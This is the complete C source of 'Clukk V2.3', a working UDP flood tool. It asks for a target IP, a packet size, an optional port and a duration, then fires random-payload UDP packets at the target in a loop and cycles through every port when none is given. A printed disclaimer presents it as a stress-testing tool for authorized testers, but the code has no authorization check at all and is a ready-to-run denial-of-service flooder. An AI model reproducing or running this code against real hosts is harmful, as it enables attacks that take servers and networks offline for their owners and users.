#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <ctype.h>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2ipdef.h>
    #include <ws2tcpip.h>
    #include <wincrypt.h>
    #pragma comment(lib, "ws2_32.lib")
    #pragma comment(lib, "advapi32.lib")
    #define CLOSE_SOCKET closesocket
    #define CLOSE_FD close
    #define inet_pton InetPtonA
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #define CLOSE_SOCKET close
    #define CLOSE_FD close
#endif

int generate_random_bytes(unsigned char *buffer, int size) {
    #ifdef _WIN32
        HCRYPTPROV hProv;
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, 0)) {
            fprintf(stderr, "Error: CryptAcquireContext failed\n");
            return 0;
        }
        if (!CryptGenRandom(hProv, size, buffer)) {
            fprintf(stderr, "Error: CryptGenRandom failed\n");
            CryptReleaseContext(hProv, 0);
            return 0;
        }
        CryptReleaseContext(hProv, 0);
        return 1;
    #else
        FILE *urandom = fopen("/dev/urandom", "rb");
        if (urandom == NULL) {
            perror("Error: fopen /dev/urandom failed");
            return 0;
        }
        size_t bytes_read = fread(buffer, 1, size, urandom);
        fclose(urandom);
        if ((int)bytes_read != size) {
            fprintf(stderr, "Error: Could not read enough random bytes.\n");
            return 0;
        }
        return 1;
    #endif
}

int main(int argc, char *argv[]) {
    int sock;
    struct sockaddr_in addr;
    int bytesAmt;
    unsigned char *bytes;
    char ip[256];
    char choice[10];
    int port;
    int portSpec;
    char duration_str[256];
    double duration;
    double timeout;
    long sent;
    int sendto_result;

    #ifdef _WIN32
        WSADATA wsa_data;
        if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
            fprintf(stderr, "Error: WSAStartup failed\n");
            return EXIT_FAILURE;
        }
    #endif

    printf("\n");
    printf("                Clukk\n");
    printf("             Release V2.3\n");
    printf("\n");

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    
    if (sock < 0) {
        perror("Error: socket creation failed");
        #ifdef _WIN32
            WSACleanup();
        #endif
        return EXIT_FAILURE;
    }

    printf("We do not want any trouble because of abusers, please use this tool for testing or educational purposes.\n");
    printf("\n");
    printf("Clukk Details:\n");
    printf("\n");
    printf("Clukk Release V2.3\n");
    printf("Creator: BSP/IOD\n");
    printf("Purpose: Stress testing\n");
    printf("for server owners and\n");
    printf("authorized testers.\n");
    printf("\n");
    printf("Multiple windows can be opened for a slight increase in speed.\n");
    printf("\n");

    printf("The maximum amount of bytes allowed by UDP is 65507.\n");
    printf("Use the xb2b.py tool to convert KB and MB to bytes.\n");
    
    printf("Amount of bytes: ");
    fflush(stdout);
    scanf("%d", &bytesAmt);
    getchar();

    if (bytesAmt < 1 || bytesAmt > 65507) {
        fprintf(stderr, "Error: Bytes must be between 1 and 65507.\n");
        CLOSE_SOCKET(sock);
        #ifdef _WIN32
            WSACleanup();
        #endif
        return EXIT_FAILURE;
    }

    bytes = (unsigned char *)malloc(bytesAmt);
    if (bytes == NULL) {
        perror("Error: malloc failed");
        CLOSE_SOCKET(sock);
        #ifdef _WIN32
            WSACleanup();
        #endif
        return EXIT_FAILURE;
    }

    if (!generate_random_bytes(bytes, bytesAmt)) {
        CLOSE_SOCKET(sock);
        free(bytes);
        #ifdef _WIN32
            WSACleanup();
        #endif
        return EXIT_FAILURE;
    }

    printf("\n");

    printf("Use the url2ip.py tool to resolve the hostname.\n");
    printf("IP: ");
    fflush(stdout);
    fgets(ip, sizeof(ip), stdin);

    ip[strcspn(ip, "\n")] = 0;

    printf("\n");

    printf("Would you like to specify a port? (y/n): ");
    fflush(stdout);
    fgets(choice, sizeof(choice), stdin);

    choice[strcspn(choice, "\n")] = 0;
    choice[0] = tolower((unsigned char)choice[0]);

    if (choice[0] == 'y') {
        printf("Port: ");
        fflush(stdout);
        scanf("%d", &port);
        getchar();
        portSpec = 1;
    } else {
        port = 1;
        portSpec = 0;
    }

    printf("\n");

    printf("Use the hour2second.py tool to convert hours to seconds.\n");
    printf("Test time in seconds: ");
    fflush(stdout);
    fgets(duration_str, sizeof(duration_str), stdin);

    duration_str[strcspn(duration_str, "\n")] = 0;

    duration = strtod(duration_str, NULL);
    if (duration <= 0) {
        fprintf(stderr, "Error: Duration must be a positive number.\n");
        CLOSE_SOCKET(sock);
        free(bytes);
        #ifdef _WIN32
            WSACleanup();
        #endif
        return EXIT_FAILURE;
    }

    printf("\n");

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip, &addr.sin_addr) <= 0) {
        fprintf(stderr, "Error: Invalid IP address.\n");
        CLOSE_SOCKET(sock);
        free(bytes);
        #ifdef _WIN32
            WSACleanup();
        #endif
        return EXIT_FAILURE;
    }

    timeout = (double)time(NULL) + duration;
    sent = 0;

    while (1) {
        if (time(NULL) > timeout) {
            break;
        }

        if (portSpec == 0) {
            port = (port < 65535) ? (port + 1) : 1;
            addr.sin_port = htons(port);
        }

        sendto_result = sendto(sock, (const char *)bytes, bytesAmt, 0,
                               (struct sockaddr *)&addr, sizeof(addr));

        if (sendto_result < 0) {
            perror("Error: sendto failed");
            CLOSE_SOCKET(sock);
            free(bytes);
            #ifdef _WIN32
                WSACleanup();
            #endif
            return EXIT_FAILURE;
        }

        sent++;
        printf("Packet #%ld of size %d bytes was sent to address %s on port %d.\n",
               sent, bytesAmt, ip, port);
    }

    CLOSE_SOCKET(sock);
    free(bytes);

    printf("\n");
    printf("Packets sent: %ld\n", sent);

    #ifdef _WIN32
        WSACleanup();
    #endif

    return EXIT_SUCCESS;
}
